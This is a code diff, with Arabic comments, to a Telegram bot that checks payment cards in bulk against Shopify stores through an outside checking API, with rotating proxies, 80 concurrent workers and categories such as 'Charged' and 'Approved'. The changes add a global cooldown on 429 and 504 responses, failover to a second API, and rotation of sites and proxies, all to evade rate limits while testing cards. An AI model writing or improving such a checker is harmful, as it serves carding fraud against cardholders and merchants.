@@ -84,15 +84,15 @@ JOIN_CHANNEL_TARGET = get_valid_target(JOIN_CHANNEL_LINK, JOIN_CHANNEL_ID)
 JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
 HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)
 
-# APIs (تم ربط المنظومة المزدوجة لتقليل السيرفر إيرور والـ 429)
+# المنظومة المزدوجة الحقيقية - قم بتغيير الروابط إلى خوادمك المنفصلة لضمان توزيع الضغط الكامل البوت سيتكفل بالباقي تلقائياً
 SHOPIFY_API_URL_1 = 'https://autosh.up.railway.app/shopii'
-SHOPIFY_API_URL_2 = 'https://autosh.up.railway.app/shopii'
+SHOPIFY_API_URL_2 = 'https://autosh.up.railway.app/shopii' # ينصح بوضع سيرفر احتياطي مختلف هنا لتفادي الانهيار الكامل
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
 
 WORKERS = 80  
-DELAY = 1.0  
-HIT_DELAY = 1.0
+DELAY = 2.0  
+HIT_DELAY = 0.5
 
 _SITE_ERRORS_COUNT = {}
 _MAX_SITE_ERRORS = 3
@@ -104,8 +104,10 @@ USER_LAST_REQ = {}
 ACTIVE_MTXT_PROCESSES = {}
 PENDING_FILES = {}
 
-# نظام الفلترة والتجميد العالمي لمنع الـ Rate Limit والـ 429 نهائياً
+# نظام الفلترة والتجميد العالمي الذكي المطور ومنع التضارب
 _RATE_LIMIT_EVENT = None
+_IS_COOLING_DOWN = False
+_COOLDOWN_LOCK = asyncio.Lock()
 
 def get_rate_limit_event():
     global _RATE_LIMIT_EVENT
@@ -195,7 +197,7 @@ CE_GEAR = '<tg-emoji emoji-id="5341715473882955310">⚙️</tg-emoji>'
 CE_SNOW = '<tg-emoji emoji-id="5449449325434266744">❄️</tg-emoji>'
 CE_BOOM = '<tg-emoji emoji-id="5276032951342088188">💥</tg-emoji>'
 
-# ====================== FLAGS ======================
+# ====================== BULLETPROOF CONFIGS ======================
 ALL_COUNTRY_CODES = ["AE","AF","AR","AT","AU","BE","BG","BR","CA","CH","CL","CN","CO","CR","CZ","DE","DK","DZ","EC","EE","EG","ES","FI","FR","GB","GR","HK","HR","HU","ID","IE","IL","IN","IT","JP","KR","KW","KZ","LB","LT","LU","LV","MA","MT","MX","MY","NG","NL","NO","NZ","OM","PA","PE","PH","PK","PL","PT","QA","RO","RS","RU","SA","SE","SG","SI","SK","TH","TR","TW","UA","US","UY","VN","ZA"]
 COUNTRY_FLAGS = {code: chr(ord(code[0]) + 127397) + chr(ord(code[1]) + 127397) for code in ALL_COUNTRY_CODES}
 
@@ -204,7 +206,6 @@ def get_flag_emoji(country_code, fallback="🏳️"):
     c = country_code.upper()
     return COUNTRY_FLAGS.get(c, chr(ord(c[0]) + 127397) + chr(ord(c[1]) + 127397) if c.isalpha() else fallback)
 
-# ====================== BULLETPROOF i.giphy DIRECT CDN LINKS (MOVIES EXPANDED) ======================
 WELCOME_GIF = "https://i.giphy.com/3o7aD2d7hy9ktXNDP2.gif"
 REDEEM_GIF = "https://i.giphy.com/l41YkxvU8c7J7Bba0.gif"
 
@@ -424,7 +425,8 @@ def is_dead_site_error(err):
     bad_keywords = [
         'step 0', 'step 0 failed', 'step 1', 'step 1 failed', 'missing stable', 'missing stablei',
         'max ret', 'cloudflare', 'timed out', 'bad gateway', 'service unavailable', 
-        'gateway timeout', 'site dead', 'session_error', 'max retries', 'max retries exceeded'
+        'gateway timeout', 'site dead', 'session_error', 'max retries', 'max retries exceeded',
+        '504', '502', '503', '429', 'tunnel', 'connection close', 'format error'
     ]
     return any(k in e for k in bad_keywords)
 
@@ -526,15 +528,8 @@ async def check_shopify_api(api_url, card, site, proxy, session, is_api_2=False)
         
         headers = {"User-Agent": "Mozilla/5.0"}
         async with session.get(req_url, headers=headers, timeout=90) as resp:
-            if resp.status == 429:
-                event = get_rate_limit_event()
-                if event.is_set():
-                    event.clear()  # تجميد فوري لجميع الخيوط الـ 80 لمنع استمرار الطلبات السيئة
-                    async def resume_workers():
-                        await asyncio.sleep(random.uniform(8.0, 15.0))  # منح السيرفر وقت كافي للتنفس وفك الـ IP
-                        event.set()
-                    asyncio.create_task(resume_workers())
-                return {'status': 'Rate Limit', 'message': 'Server Error 429', 'card': card, 'retry': True}
+            if resp.status in [429, 502, 503, 504]:
+                return {'status': 'Rate Limit', 'message': f'Server Error {resp.status}', 'card': card, 'retry': True}
                 
             text_data = await resp.text()
             if resp.status != 200: 
@@ -548,7 +543,7 @@ async def check_shopify_api(api_url, card, site, proxy, session, is_api_2=False)
         st = str(rj.get('Status', '')).strip().lower()
         rl = rm.lower()
         
-        if is_dead_site_error(rm) or any(k in rl for k in ['proxy', 'timeout', 'error', 'session', 'bad gateway', 'max ret']):
+        if is_dead_site_error(rm) or any(k in rl for k in ['proxy', 'timeout', 'error', 'session', 'bad gateway', 'max ret', 'step 0']):
             return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
         if 'insufficient' in rl or 'funds' in rl or 'balance' in rl:
             return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': gt, 'price': pr}
@@ -572,11 +567,12 @@ async def remove_proxy_by_url(uid, proxy_url):
     except Exception: pass
 
 async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid, max_retries=3):
+    global _IS_COOLING_DOWN
     lr = None
     event = get_rate_limit_event()
     
     for attempt in range(max_retries):
-        await event.wait()  # الانتظار الإلزامي هنا إذا كانت هناك حالة تجميد عالمية بسبب الـ 429
+        await event.wait()  # الحظر الفوري لأي خيط مستدعى أثناء حالة التجميد
         
         if not proxies: 
             p_dict = p = None
@@ -588,64 +584,86 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
         if not acs: 
             _SITE_ERRORS_COUNT.clear()
             acs = sites
-            await asyncio.sleep(1.5) 
+            await asyncio.sleep(1.0) 
             
         s = random.choice(acs) if acs else ""
         if not s:
             return {'status': 'Dead', 'message': 'No Available Sites', 'card': card}
         
         if gateway_name == "Shopify":
-            # المحاولة الأولى على السيرفر (API 1) الأساسي
+            # محاولة الإرسال الأولى على السيرفر الأساسي
             r = await check_shopify_api(SHOPIFY_API_URL_1, card, s, p, session, is_api_2=False)
-            
             status = r.get('status')
-            msg = r.get('message', '')
-            msg_lower = str(msg).lower()
+            msg = str(r.get('message', '')).lower()
             
-            # فلترة ذكية: إذا كان الرد ليس رد مالي صريح، أو يحتوي على أخطاء الـ 429 والـ max ret والـ step 0
-            is_clean = status in ['Charged', 'Approved', 'Insufficient', 'Dead'] and not any(k in msg_lower for k in ['429', 'step 0', 'max ret', 'site dead', 'error', 'tunnel'])
-            
-            if not is_clean:
-                # التحويل التلقائي الذكي فوراً وبنفس اللحظة على الـ API 2 لإنقاذ الفحص وتقليل الـ Server Error
-                r = await check_shopify_api(SHOPIFY_API_URL_2, card, s, p, session, is_api_2=True)
+            # هندسة الفلترة الذكية لإصلاح كوارث الـ 429 والـ 504
+            if status == 'Rate Limit' or '429' in msg or '504' in msg or 'gateway' in msg:
+                async with _COOLDOWN_LOCK:
+                    if not _IS_COOLING_DOWN:
+                        _IS_COOLING_DOWN = True
+                        event.clear()  # إغلاق البوابة لمنع الـ 80 خيط الآخرين
+                        async def resume_workers():
+                            global _IS_COOLING_DOWN
+                            await asyncio.sleep(random.uniform(10.0, 16.0)) # منح الـ IP فرصة تنفس كاملة
+                            _IS_COOLING_DOWN = False
+                            event.set()
+                        asyncio.create_task(resume_workers())
+                await event.wait()
+                await asyncio.sleep(random.uniform(1.0, 3.0))
+                lr = r
+                continue
+
+            # تكتيك عزل أخطاء المواقع وتغيير الوجهة تماماً على السيرفر البديل بـ بروكسي وموقع جديدين
+            if status == 'Site Error' or is_dead_site_error(msg) or 'step 0' in msg or 'max ret' in msg:
+                _SITE_ERRORS_COUNT[s] = _SITE_ERRORS_COUNT.get(s, 0) + 1
+                
+                # تدوير عشوائي جديد لإنقاذ الفحص في نفس الثانية
+                if proxies:
+                    p_dict2 = random.choice(proxies)
+                    p2 = p_dict2['proxy_url']
+                else: p_dict2 = p2 = None
+                
+                acs2 = [st for st in sites if _SITE_ERRORS_COUNT.get(st, 0) < _MAX_SITE_ERRORS]
+                s2 = random.choice(acs2) if acs2 else random.choice(sites)
+                
+                # إطلاق المنظومة المزدوجة على السيرفر البديل
+                r = await check_shopify_api(SHOPIFY_API_URL_2, card, s2, p2, session, is_api_2=True)
                 status = r.get('status')
-                msg = r.get('message', '')
-                msg_lower = str(msg).lower()
+                msg = str(r.get('message', '')).lower()
+                
+                if status == 'Rate Limit' or '429' in msg or '504' in msg:
+                    async with _COOLDOWN_LOCK:
+                        if not _IS_COOLING_DOWN:
+                            _IS_COOLING_DOWN = True
+                            event.clear()
+                            async def resume_workers():
+                                global _IS_COOLING_DOWN
+                                await asyncio.sleep(random.uniform(10.0, 16.0))
+                                _IS_COOLING_DOWN = False
+                                event.set()
+                            asyncio.create_task(resume_workers())
+                    await event.wait()
+                    lr = r
+                    continue
+                    
+                if status == 'Site Error' or is_dead_site_error(msg):
+                    _SITE_ERRORS_COUNT[s2] = _SITE_ERRORS_COUNT.get(s2, 0) + 1
+                    if p_dict2 and proxies and p_dict2 in proxies:
+                        try: proxies.remove(p_dict2)
+                        except ValueError: pass
+                        asyncio.create_task(remove_proxy_by_url(uid, p2))
+                    await asyncio.sleep(DELAY)
+                    lr = r
+                    continue
         else:
             return {'status': 'Dead', 'message': 'Unknown Gateway', 'card': card}
         
-        if status == 'Rate Limit' or '429' in msg_lower:
-            event = get_rate_limit_event()
-            if event.is_set():
-                event.clear()  # تجميد فوري لجميع الخيوط الـ 80 لمنع استمرار الطلبات السيئة
-                async def resume_workers():
-                    await asyncio.sleep(random.uniform(8.0, 15.0))  # منح السيرفر وقت كافي للتنفس وفك الـ IP
-                    event.set()
-                asyncio.create_task(resume_workers())
-            await event.wait()  # التأكد من عدم تخطي التجميد إلا بعد فك القفل بالكامل
-            await asyncio.sleep(random.uniform(2.0, 4.0))  # تهدئة فردية للخيط لضمان توزيع الهجمات
-            lr = r
-            continue
-
-        if status == 'Site Error' or is_dead_site_error(msg):
-            _SITE_ERRORS_COUNT[s] = _SITE_ERRORS_COUNT.get(s, 0) + 1
-            if any(k in msg_lower for k in ['step 0', 'step 0 failed', 'max ret', 'site dead']):
-                _SITE_ERRORS_COUNT[s] = _MAX_SITE_ERRORS 
-                
-            if p_dict and any(k in msg_lower for k in ['proxy', 'tunnel', 'connection close', 'timeout', 'refused', '407', '502', '504', 'bad gateway', 'site error', 'format error']):
-                if p_dict in proxies:
-                    try: proxies.remove(p_dict)
-                    except ValueError: pass
-                asyncio.create_task(remove_proxy_by_url(uid, p))
-            lr = r
-            await asyncio.sleep(DELAY)
-            continue
-            
         if not r.get('retry'):
             if status in ['Charged', 'Approved', 'Insufficient', 'Dead']: 
                 _SITE_ERRORS_COUNT[s] = max(0, _SITE_ERRORS_COUNT.get(s, 0) - 1)
             return r
-        lr = r; await asyncio.sleep(DELAY)
+        lr = r
+        await asyncio.sleep(DELAY)
         
     if lr: return {'status': 'Dead', 'message': f'{str(lr["message"])[:40]}', 'card': card, 'gateway': gateway_name, 'price': lr.get('price', '-')}
     return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': gateway_name, 'price': '-'}
@@ -1169,7 +1187,7 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
     sem = asyncio.Semaphore(WORKERS)
 
     async def worker(wid):
-        await asyncio.sleep(wid * 0.1)
+        await asyncio.sleep(wid * 0.05)
         nonlocal chk, chg, app, ins, dec, err, last_resp
         while not queue.empty() and not is_stopped():
             try: card = queue.get_nowait()
